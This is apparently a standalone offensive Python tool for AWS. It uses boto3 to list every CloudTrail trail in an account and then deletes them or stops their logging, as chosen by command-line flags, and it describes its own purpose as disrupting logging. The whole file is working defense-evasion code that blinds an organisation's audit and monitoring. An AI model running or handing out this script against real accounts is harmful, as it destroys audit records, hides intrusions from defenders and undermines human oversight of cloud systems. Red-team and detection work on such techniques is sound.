#!/usr/bin/env python
from __future__ import print_function
import boto3
from botocore.exceptions import ClientError
import json
import argparse


def main(args):
    all_results = []

    trails = get_trails()
    if not trails:
        print("No cloudtrails found.")
        return
        
    if(args.delete):
        delete_trails(trails)
    if(args.stop):
        stop_trails(trails)


def delete_trails(trails):
    client = boto3.client('cloudtrail')
    for trail in trails:
        try:
            response = client.delete_trail(Name=trail['TrailARN'])
            print('Deleted: ' + trail['TrailARN'])
        except ClientError as e:
            print('Failed to delete: ' + trail['TrailARN']) 


def stop_trails(trails):
    client = boto3.client('cloudtrail')
    for trail in trails:
        try:
            response = client.stop_logging(Name=trail['TrailARN'])
            print('Stopped: ' + trail['TrailARN'])
        except ClientError as e:
            print('Failed to stop: ' + trail['TrailARN'])        


def get_trails():
    client = boto3.client('cloudtrail')
    result = []

    try:
        response = client.describe_trails()
        result = response['trailList']
    except ClientError as e:
        print(e.response['Error']['Message'])

    return result


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Attempts to disrupt logging in the specified way.")
    parser.add_argument('-d',
                        '--delete',
                        action='store_true')
    parser.add_argument('-s',
                        '--stop',
                        action='store_true')
    args = parser.parse_args()
    main(args)